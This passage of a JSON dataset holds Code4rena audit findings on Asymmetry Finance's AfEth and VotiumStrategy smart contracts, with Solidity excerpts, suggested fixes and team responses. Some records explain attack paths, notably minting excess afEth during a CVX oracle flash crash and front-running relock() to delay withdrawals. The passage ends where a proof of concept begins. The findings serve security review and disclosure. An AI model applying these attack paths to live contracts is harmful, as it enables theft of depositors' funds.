      "content": "\nBoth AfEth and VotiumStrategy behave like vaults. They take deposits, mint ERC20 tokens in representation of this deposit, and have a withdraw function to recover the assets back.\n\nThis is exactly the use case of the [ERC4626 standard](https://eips.ethereum.org/EIPS/eip-4626). Consider using this standard to improve composability.\n\n**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/56#issuecomment-1746203991):**\n > L-06 & L-10 - `AbstractStrategy(vEthAddress).withdraw()` will revert if `withdrawIdToWithdrawRequestInfo[_withdrawId].withdrawn` holds true.\n\n**[elmutt (Asymmetry) confirmed](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/56#issuecomment-1747060202)**\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30020",
      "title": "[N-05] Missing check for zero address value in constructor or setter",
      "impact": "LOW",
      "content": "\nAddress parameters should be validated to guard against the default value `address(0)`.\n\n*Instances (6)*:\n\n- `vEthAddress` in [`AfEth::setStrategyAddress()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L81)\n- `feeAddress` in [`AfEth::setFeeAddress()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L98)\n- `rewarder` in [`VotiumStrategyCore::initialize()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L112)\n- `manager` in [`VotiumStrategyCore::initialize()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L113)\n- `chainlinkCvxEthFeed` in [`VotiumStrategyCore::setChainlinkCvxEthFeed()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L76)\n- `rewarder` in [`VotiumStrategyCore::setRewarder()`](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L125)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30019",
      "title": "[N-04] Use constants for literal or magic values",
      "impact": "LOW",
      "content": "\nConsider defining constants for literal or magic values as it improves readability and prevents duplication of config values.\n\n*Instances (9)*:\n\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L105\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L106\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L107\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L117\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L180\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L230\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L253\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L314\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L323\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30018",
      "title": "[N-03] Unused constants",
      "impact": "LOW",
      "content": "\nUnreferenced private constants in contracts can be removed.\n\n*Instances (2)*:\n\n- [AfEth::CVX_ADDRESS](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L50)\n- [AfEth::VLCVX_ADDRESS](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L52)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30017",
      "title": "[N-02] Missing event for important parameter change",
      "impact": "LOW",
      "content": "\nImportant parameter or configuration changes should trigger an event to allow being tracked off-chain.\n\n*Instances (8)*:\n\n- [AfEth::setStrategyAddress()](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L81)\n- [AfEth::setRatio()](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L90)\n- [AfEth::setFeeAddress()](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L98)\n- [AfEth::setProtocolFee()](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L106)\n- [AfEth::setPauseDeposit()](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L116)\n- [AfEth::setPauseWithdraw()](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L124)\n- [VotiumStrategyCore::setChainlinkCvxEthFeed()](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L76)\n- [VotiumStrategyCore::setRewarder()](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L125)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30016",
      "title": "[N-01] Remove debug symbols",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L18\n\nRemove any code related to debug functionality.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30015",
      "title": "[L-17] Potential rounding to zero issue in AfEth deposit could cause loss of value",
      "impact": "LOW",
      "content": "\nDeposits in the AfEth contract are split based on a configured `ratio`. One portion of the split goes to SafEth, while the other is deposited in the Votium strategy.\n\nhttps://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L148-L169\n\n```solidity\n148:     function deposit(uint256 _minout) external payable virtual {\n149:         if (pauseDeposit) revert Paused();\n150:         uint256 amount = msg.value;\n151:         uint256 priceBeforeDeposit = price();\n152:         uint256 totalValue;\n153: \n154:         AbstractStrategy vStrategy = AbstractStrategy(vEthAddress);\n155: \n156:         uint256 sValue = (amount * ratio) / 1e18;\n157:         uint256 sMinted = sValue > 0\n158:             ? ISafEth(SAF_ETH_ADDRESS).stake{value: sValue}(0)\n159:             : 0;\n160:         uint256 vValue = (amount * (1e18 - ratio)) / 1e18;\n161:         uint256 vMinted = vValue > 0 ? vStrategy.deposit{value: vValue}() : 0;\n162:         totalValue +=\n163:             (sMinted * ISafEth(SAF_ETH_ADDRESS).approxPrice(true)) +\n164:             (vMinted * vStrategy.price());\n165:         if (totalValue == 0) revert FailedToDeposit();\n166:         uint256 amountToMint = totalValue / priceBeforeDeposit;\n167:         if (amountToMint < _minout) revert BelowMinOut();\n168:         _mint(msg.sender, amountToMint);\n169:     }\n```\n\nThe amounts that go into each are calculated in lines 156 and 160. Both `sValue` and `vValue` calculations could be rounded down to zero if the numerator is lower than the denominator.\n\nEven with a low `ratio` value, the amounts lost are negligible, hence the low severity.\n\nFor example, given a small `ratio` of 1% (i.e. `1e16`) we have:\n\n```\namount * ratio < 1e18\namount < 1e18 / ratio\namount < 1e18 / 1e16\namount < 100\n```\n\nAmount should be lower than 100 wei in order to be rounded down to zero.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30014",
      "title": "[L-16] Protocol doesn't collect fees from SafEth",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L272\n\nProtocol fees are only collected as part of the deposited rewards coming from the VotiumStrategy contract. Votium and Convex rewards are claimed and deposited back in the protocol as an explicit compound action.\n\nOn the other hand, SafEth accrues value by the passive appreciation of the underlying LSD tokens backing the protocol. There is no explicit process for claiming or compounding this increase in SafEth token value. The protocol isn't collecting fees from this side of the split.\n\nIt is not clear if this is by design or a potential oversight in the implementation.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30013",
      "title": "[L-15] Protocol fees are not collected when rewards are not routed through AfEth",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L302-L304\n\nProtocol fees are collected in `AfEth::depositRewards()`, just before rewards are being compounded in the protocol.\n\nThe reward flow is initiated in `VotiumStrategyCore::applyRewards()`, and will deposit rewards in AfEth only if the manager address is defined:\n\n```solidity\n302:         if (address(manager) != address(0))\n303:             IAfEth(manager).depositRewards{value: ethReceived}(ethReceived);\n304:         else depositRewards(ethReceived);\n```\n\nIt is important to note that if rewards aren't channeled through AfEth, the protocol will not receive any fees.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30012",
      "title": "[L-14] Low level calls to account with no code will not fail",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L292\n\nLow level calls (i.e. `address.call(...)`) to account with no code will silently succeed without reverting or throwing any error. Quoting the reference for the CALL opcode in evm.codes:\n\n> Creates a new sub context and execute the code of the given account, then resumes the current one. Note that an account with no code will return success as true.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30011",
      "title": "[L-13] Zero token allowance can cause denial of service in `applyRewards()`",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L282-L285\n\n```solidity\nIERC20(_swapsData[i].sellToken).approve(\n    address(_swapsData[i].spender),\n    0\n);\n```\n\nDuring `applyRewards()`, token allowances are first reset to zero before being increased to infinity. This could cause issues with some ERC20 implementations that revert on zero value approvals, such as [BNB](https://etherscan.io/token/0xB8c77482e45F1F44dE1745F52C74426C631bDD52#code#L92).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30010",
      "title": "[L-12] Missing usage of safe wrappers to handle ERC20 operations",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L216\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L282\n- https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L287\n\nERC20 operations on arbitrary tokens should be [safely wrapped](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#SafeERC20) to account for incompatible implementations.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30009",
      "title": "[L-11] VotiumStrategy allows to recover ERC20 tokens but not native ETH",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L215\n\nThe implementation of `withdrawStuckTokens()` allows the owner of the protocol to recover any ERC20 token, but fails to consider native ETH transfers.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30008",
      "title": "[L-10] Function `canWithdraw()` in VotiumStrategy doesn't check if withdrawal has been already executed",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L155\n\nThe implementation of `canWithdraw()` in the VotiumStrategy contract just checks if the required epoch has been reached, but doesn't validate if the request has been already fulfilled (`WithdrawRequestInfo.withdrawn`).\n\nConsider also checking for the `withdrawn` condition as part of the implementation of `canWithdraw()`.\n\n```solidity\nfunction canWithdraw(\n    uint256 _withdrawId\n) external view virtual override returns (bool) {\n    uint256 currentEpoch = ILockedCvx(VLCVX_ADDRESS).findEpochId(\n        block.timestamp\n    );\n    return\n        withdrawIdToWithdrawRequestInfo[_withdrawId].epoch <= currentEpoch && !withdrawIdToWithdrawRequestInfo[_withdrawId].withdrawn;\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30007",
      "title": "[L-09] Missing call to base initializers",
      "impact": "LOW",
      "content": "\nUpgradeable contracts that inherit from other base contracts should call the corresponding base initializers during initialization.\n\n*Instances (4)*:\n\n- [AfEth::OwnableUpgradeable](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L72)\n- [AfEth::ERC20Upgradeable](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L72)\n- [AbstractStrategy::ReentrancyGuardUpgradeable](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/AbstractStrategy.sol#L10)\n- [VotiumStrategyCore::OwnableUpgradeable](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L100)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30006",
      "title": "[L-08] Public relock function can be used to grief withdrawal requests",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L135\n\nA malicious user can call `relock()` to front-run a transaction to `requestWithdraw()`. \n\nRelocking will take any available CVX in the contract and expired locks in CvxLocker and relock them. Griefed users will need to wait more, as any of the available balance that could have been used for the withdrawal has been relocked as part of the front-running.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30005",
      "title": "[L-07] Prevent AfEth token transfers to its own contract",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L183\n\nWhen a user requests a withdrawal in AfEth, their tokens are transferred to the contract and \"locked\" until the withdrawal is made effective, at which point the tokens are burned.\n\nGiven this mechanism, AfEth tokens held by the same contract are considered as locked tokens but anyone can technically transfer tokens to the contract by calling `transfer()` or `transferFrom()`.\n\nConsider adding a check to the base ERC20 functionality to prevent AfEth tokens from being sent to the contract by external actors.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30004",
      "title": "[L-06] Validate withdrawals in AfEth have been already executed",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L243\n\nWithdrawals in AfEth are first enqueued when requested, and executed later when the vAfEth tokens are ready to be withdrawn. The `withdraw()` function in AfEth validates that the withdrawal is ready (by using `canWithdraw()`) but doesn't validate if the withdrawal has been already executed.\n\nThis isn't currently exploitable since the withdrawal in AfEth also depends on the withdrawal in VotiumStrategy, which correctly checks if the withdrawal associated to the `vEthWithdrawId` has been already claimed. Consider adding a similar check to `AfEth::withdraw()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30003",
      "title": "[L-05] Price calculations may experience precision loss due to division before multiplication",
      "impact": "LOW",
      "content": "\nThere are several places across the codebase in which intermediate results that depend on a division are then used as part of calculations that involve a multiple.\n\nFor example, in `requestWithdraw()` the calculation of `votiumWithdrawAmount` depends on the intermediate result of `withdrawRatio`. The expression can be simplified as:\n\n```solidity\nuint256 votiumWithdrawAmount = (_amount * votiumBalance) / (totalSupply() - afEthBalance);\n```\n\nAnd similarly, `safEthWithdrawAmount`:\n\n```solidity\nuint256 safEthWithdrawAmount = (_amount * safEthBalance) / (totalSupply() - afEthBalance);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30002",
      "title": "[L-04] Validate ratio argument in `setRatio()`",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L90\n\nThe `ratio` configuration parameter in AfEth measures the portion of deposited value that goes into the SafEth contract. This value is intended to range between `0` (0%) and `1e18` (100%).\n\nThe `setRatio()` function should validate that the new value is within bounds, i.e. `require(_newRatio <= 1e18)`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30001",
      "title": "[L-03] Missing name and symbol for AfEth token",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L72\n\nThe AfEth contract inherits from ERC20Upgradeable but doesn't call its base initializer, which is in charge of setting the name and symbol for the ERC20 token.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30000",
      "title": "[L-02] Use Ownable2Step instead of Ownable for access control",
      "impact": "LOW",
      "content": "\nUse the [Ownable2Step](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol) variant of the Ownable contract to better safeguard against accidental transfers of access control.\n\n*Instances (2)*:\n\n- [AfEth](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L10)\n- [VotiumStrategyCore](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L24)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "29999",
      "title": "[L-01] Hardcoded addresses may not be compatible with a multi-chain deployment",
      "impact": "LOW",
      "content": "\nThe codebase is full of hardcoded addresses that refer to other parts of the protocol (SafEth, for example) or third-party protocols (e.g. Votium, Convex, Curve Pools).\n\nAssumptions of the presence of third-party protocol, their deployment addresses and/or their arguments will prevent or complicate deployments in layer 2 chains. This is stated as a possibility in the documentation: \n\n> This will only be deployed to Ethereum Mainnet, with the chance of being deployed on L2's on a future date\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "29998",
      "title": "[M-10] It might not be possible to `applyRewards()`, if an amount received is less than 0.05 eth",
      "impact": "MEDIUM",
      "content": "\n*   Upon claiming Votium rewards, `applyRewards()` is intended to be invoked bi-weekly in order to exchange the tokens for eth and put the eth received back into the strategies. Based on the current `ratio` it either stakes the amount into safETH or obtains some CVX by selling eth on Curve and then locks them to get vlCVX.\n\n    *   ```Solidity\n        uint256 safEthRatio = (safEthTvl * 1e18) / totalTvl;\n        if (safEthRatio < ratio) {\n            ISafEth(SAF_ETH_ADDRESS).stake{value: amount}(0);\n        } else {\n            votiumStrategy.depositRewards{value: amount}(amount);\n        }\n\n        ```\n\n*   Let's say the `safEthRatio < ratio`, which triggers `ISafEth(SAF_ETH_ADDRESS).stake{value: amount}` being invoked. And if the `amount < ISafEth(SAF_ETH_ADDRESS).minAmount`. The whole re-investing strategy collapses.\n\n*   As of Sep. 2023, the Votium rewards are 0,000016 eth for 1 vlCVX per round, it means, we need at least 3125 vlCVX being delegated to the Votium in order to pass the threshold.\n\n### Impact\n\n*   This could backfire in early stages or during certain market conditions, where the amount of vlCVX hold by afETH is not enough to generate 0.05 eth bi-weekly. Basically, that forces to flows that are inconsistent with the main re-investment flow proposed by Asymmetry, which ultimately could result in theft as demonstrated in the issue #15.\n\n### Recommended Mitigation Steps\n\n*   Short term:\n    *   Wrapp `IAfEth(manager).depositRewards` into the try/catch block. And if one of the following conditions arises:\n        *   The min safETH deposit amount is not reached\n        *   Chainlink price feed could not be validated\n        *   Low-level call which sends fees fails\n        just simply invoke `VotiumStrategy.depositRewards()`.\n        ```Solidity\n          if (address(manager) == address(0)) {\n              depositRewards(ethReceived);\n          } else {\n              try IAfEth(manager).depositRewards{value: ethReceived}(ethReceived) {}\n              catch {depositRewards(ethReceived);}\n          }\n        ```\n*   Long term: N/A\n\n**[elmutt (Asymmetry) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/16#issuecomment-1738288823):**\n > Nice find. At first glance it doesn't seem to matter but when you pointed out out early market conditions resulting in less rewards it makes total sense that it will be a problem we will likely encounter.\n\n**[m\\_Rassska (Warden) commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/16#issuecomment-1742024867):**\n > The reward threshold defined here should be changed to: \n> \n> $$ \\frac{0,000016} {ratio} * \\sum_{i = 0}^{lockedBalances.length - 1} lockedBalances[i] $$\n> \n> Meaning that: \n>  - if the `ratio = 1e18` => the rewards > 0,05eth\n>  - if the `ratio = 5e17` => the rewards > 0,1eth\n\n**[elmutt (Asymmetry) confirmed and commented](https://github.com/code-423n4/2023-09-asymmetry-findings/issues/16#issuecomment-1742076103):**\n >Thanks! After discussing internally we decided to solve this by calling setMinAmount(0) on the safEth contract.\n> \n> Done here: https://etherscan.io/tx/0xb024f513adb9a8fa3bbceceeb6c11d2a1bc9c5e3545dfa76f6d6e0c8bdaf38a3\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-10-asymmetry-mitigation#mitigations-to-be-reviewed):**\n > No code changes needed. We removed the minimum stake amount from `SafEth`, as noted above.\n\n**Status**: Mitigation confirmed. Full details in reports from [m\\_Rassska](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/25), [adriro](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/44), and [d3e4](https://github.com/code-423n4/2023-10-asymmetry-mitigation-findings/issues/33).\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the `applyRewards()` function in the Votium rewards system. This function is supposed to be called every two weeks to exchange tokens for ETH and reinvest the ETH into strategies. However, there is a problem when the `safEthRatio` is less than the `ratio` value, as it can cause the entire reinvestment strategy to fail if the amount is less than the minimum required by the SafEth contract. This could lead to inconsistent flows and potential theft. The recommended mitigation steps include wrapping the `depositRewards()` function in a try/catch block and changing the reward threshold calculation. Asymmetry has confirmed that the issue has been resolved by removing the minimum stake amount from the SafEth contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-09-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-09-asymmetry-findings/issues/16",
      "tags": [],
      "finders": [
        "m\\_Rassska"
      ]
    },
    {
      "id": "29997",
      "title": "[M-09] Missing circuit breaker checks in `ethPerCvx()` for Chainlink's price feed",
      "impact": "MEDIUM",
      "content": "\nThe `ethPerCvx()` function relies on a Chainlink oracle to fetch the CVX / ETH price:\n\n[VotiumStrategyCore.sol#L158-L169](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L158-L169)\n\n```solidity\n        try chainlinkCvxEthFeed.latestRoundData() returns (\n            uint80 roundId,\n            int256 answer,\n            uint256 /* startedAt */,\n            uint256 updatedAt,\n            uint80 /* answeredInRound */\n        ) {\n            cl.success = true;\n            cl.roundId = roundId;\n            cl.answer = answer;\n            cl.updatedAt = updatedAt;\n        } catch {\n```\n\nThe return values from `latestRoundData()` are validated as such:\n\n[VotiumStrategyCore.sol#L173-L181](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategyCore.sol#L173-L181)\n\n```solidity\n        if (\n            (!_validate ||\n                (cl.success == true &&\n                    cl.roundId != 0 &&\n                    cl.answer >= 0 &&\n                    cl.updatedAt != 0 &&\n                    cl.updatedAt <= block.timestamp &&\n                    block.timestamp - cl.updatedAt <= 25 hours))\n        ) {\n```\n\nAs seen from above, there is no check to ensure that `cl.answer` does not go below or above a certain price.\n\nChainlink aggregators have a built in circuit breaker if the price of an asset goes outside of a predetermined price band. Therefore, if CVX experiences a huge drop/rise in value, the CVX / ETH price feed will continue to return `minAnswer`/`maxAnswer` instead of the actual price of CVX.\n\nCurrently, `minAnswer` is set to `1e13` and `maxAnswer` is set to `1e18`. This can be checked by looking at the [AccessControlledOffchainAggregator](https://etherscan.io/address/0xf1F7F7BFCc5E9D6BB8D9617756beC06A5Cbe1a49) contract for the CVX / ETH price feed. Therefore, if CVX ever experiences a flash crash and its price drops to below `1e13` (eg. `100`), the `cl.answer` will still be `1e13`.\n\nThis becomes problematic as `ethPerCvx()` is used to determine the price of vAfEth:\n\n[VotiumStrategy.sol#L31-L33](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/strategies/votium/VotiumStrategy.sol#L31-L33)\n\n```solidity\n    function price() external view override returns (uint256) {\n        return (cvxPerVotium() * ethPerCvx(false)) / 1e18;\n    }\n```\n\nFurthermore, vAfEth's price is used to calculate the amount of AfEth to mint to users whenever they call `deposit()`:\n\n[AfEth.sol#L162-L166](https://github.com/code-423n4/2023-09-asymmetry/blob/main/contracts/AfEth.sol#L162-L166)\n\n```solidity\n        totalValue +=\n            (sMinted * ISafEth(SAF_ETH_ADDRESS).approxPrice(true)) +\n            (vMinted * vStrategy.price());\n        if (totalValue == 0) revert FailedToDeposit();\n        uint256 amountToMint = totalValue / priceBeforeDeposit;\n```\n\nIf CVX experiences a flash crash, `vStrategy.price()` will be `1e13`, which is much larger than the actual price of CVX. This will cause `totalValue` to become extremely large, which in turn causes `amountToMint` to be extremely large as well. Therefore, the caller will receive a huge amount of afEth.\n\n### Impact\n\nDue to Chainlink's in-built circuit breaker mechanism, if CVX experiences a flash crash, `ethPerCvx()` will return a price higher than the actual price of CVX. Should this occur, an attacker can call `deposit()` to receive a huge amount of afEth as it uses an incorrect CVX price.\n\nThis would lead to a loss of funds for previous depositors, as the attacker would hold a majority of afEth's total supply and can withdraw most of the protocol's TVL.\n\n### Proof of Concept\n\nAssume the 